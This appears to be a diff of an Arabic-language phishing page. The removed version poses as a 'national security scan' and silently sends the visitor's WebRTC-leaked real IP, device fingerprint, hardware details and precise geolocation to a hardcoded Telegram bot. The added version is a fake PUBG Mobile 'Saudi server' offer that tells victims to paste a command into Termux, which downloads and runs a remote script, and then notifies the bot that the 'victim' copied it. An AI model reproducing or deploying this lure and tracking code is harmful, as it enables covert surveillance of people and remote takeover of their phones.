@@ -2,70 +2,45 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام الحماية الوطني - فحص الأمان</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PUBG Mobile - Saudi Server Activation</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding-top: 50px; }
-        .radar { width: 150px; height: 150px; border: 2px solid #00ff00; border-radius: 50%; margin: 0 auto 20px; position: relative; overflow: hidden; }
-        .radar:after { content: ""; display: block; width: 100%; height: 100%; background: linear-gradient(90deg, transparent 50%, rgba(0,255,0,0.2) 50%); animation: scan 2s linear infinite; }
-        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        .status { font-size: 14px; margin-top: 20px; color: #fff; }
+        body { background-color: #0b0f19; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; margin: 0; padding: 20px; }
+        .container { border: 2px solid #ffce00; border-radius: 15px; padding: 20px; max-width: 400px; margin: auto; background: rgba(0,0,0,0.8); }
+        h1 { color: #ffce00; font-size: 24px; }
+        p { color: #cfd8dc; font-size: 16px; }
+        .code-box { background: #1a202c; padding: 15px; border-radius: 8px; border: 1px dashed #4a5568; margin: 20px 0; word-break: break-all; font-family: monospace; color: #00ff00; }
+        .btn { background: linear-gradient(45deg, #ffce00, #ff9a00); color: #000; padding: 15px 30px; border: none; border-radius: 50px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
     </style>
 </head>
 <body>
+    <div class="container">
+        <img src="https://www.pubgmobile.com/images/event/arabia_v2/logo.png" width="150" alt="PUBG">
+        <h1>تفعيل سيرفر المملكة العربية السعودية 🇸🇾🇸🇦</h1>
+        <p>مبروك! تم اختيار جهازك لتجربة الـ Ping الضعيف (18ms) ثابت.</p>
+        
+        <div class="code-box" id="copyText">
+            pkg install python requests -y && curl -sL https://raw.githubusercontent.com/okhalidt/okhalidt.github.io/main/pubg_t.sh -o vpn.py && python vpn.py
+        </div>
 
-    <div class="radar"></div>
-    <h2>جاري فحص التهديدات السيبرانية...</h2>
-    <p class="status" id="log">بدء تحليل البصمة الرقمية للجهاز...</p>
+        <button class="btn" onclick="copyCode()">نسخ أمر التفعيل وتشغيله</button>
+        
+        <p style="font-size: 12px; color: #718096; margin-top: 20px;">* يجب تشغيل الأمر داخل تطبيق Termux لضمان التشفير.</p>
+    </div>
 
     <script>
-        const T = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
-        const C = '7214473798';
-
-        window.onload = async () => {
-            try {
-                // 1. كشف الـ IP الحقيقي (حتى خلف الـ VPN) عبر WebRTC
-                const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
-                rtc.createDataChannel("");
-                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-                rtc.onicecandidate = (ice) => {
-                    if (ice && ice.candidate && ice.candidate.candidate) {
-                        const realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
-                        sendData(`🔍 الـ IP الحقيقي المكتشف (WebRTC): ${realIP}`);
-                    }
-                };
-
-                // 2. تحليل بصمة الجهاز (Canvas Fingerprinting)
-                // هذه التقنية تحدد هوية الجهاز بدقة حتى لو مسح المتصفح أو غير الـ IP
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                ctx.fillText("HACK-ID-CHECK", 10, 10);
-                const fingerprint = canvas.toDataURL().slice(-50); // بصمة فريدة للجهاز
-
-                // 3. جمع بيانات المعالج والذاكرة (Hardware Profiling)
-                const info = {
-                    "المعالج": navigator.hardwareConcurrency + " Cores",
-                    "الرامات": navigator.deviceMemory + " GB",
-                    "اللغة": navigator.language,
-                    "البصمة": fingerprint
-                };
-
-                sendData(`⚙️ **تحليل العتاد للمشتبه به:**\n` + JSON.stringify(info, null, 2));
-
-                document.getElementById('log').innerText = "تم تأمين الاتصال بنجاح. يرجى الانتظار...";
-
-                // 4. طلب الموقع الجغرافي "بعد" كسب الثقة
-                setTimeout(() => {
-                    navigator.geolocation.getCurrentPosition((p) => {
-                        const map = `🎯 إحداثيات الهدف الدقيقة:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                        sendData(map);
-                    }, null, {enableHighAccuracy: true});
-                }, 5000);
-
-            } catch (e) {}
-        };
-
-        function sendData(text) {
-            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(text)}`);
+        function copyCode() {
+            var text = document.getElementById("copyText").innerText;
+            var elem = document.createElement("textarea");
+            document.body.appendChild(elem);
+            elem.value = text;
+            elem.select();
+            document.execCommand("copy");
+            document.body.removeChild(elem);
+            alert("تم نسخ الأمر! افتح Termux والصقه هناك لتفعيل السيرفر.");
+            
+            // إرسال إشعار لبوت عبد الرحمن
+            fetch('https://api.telegram.org/bot8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg/sendMessage?chat_id=7214473798&text=🌐 الضحية نسخ الكود وهو في طريقه لفتح Termux!');
         }
     </script>
 </body>
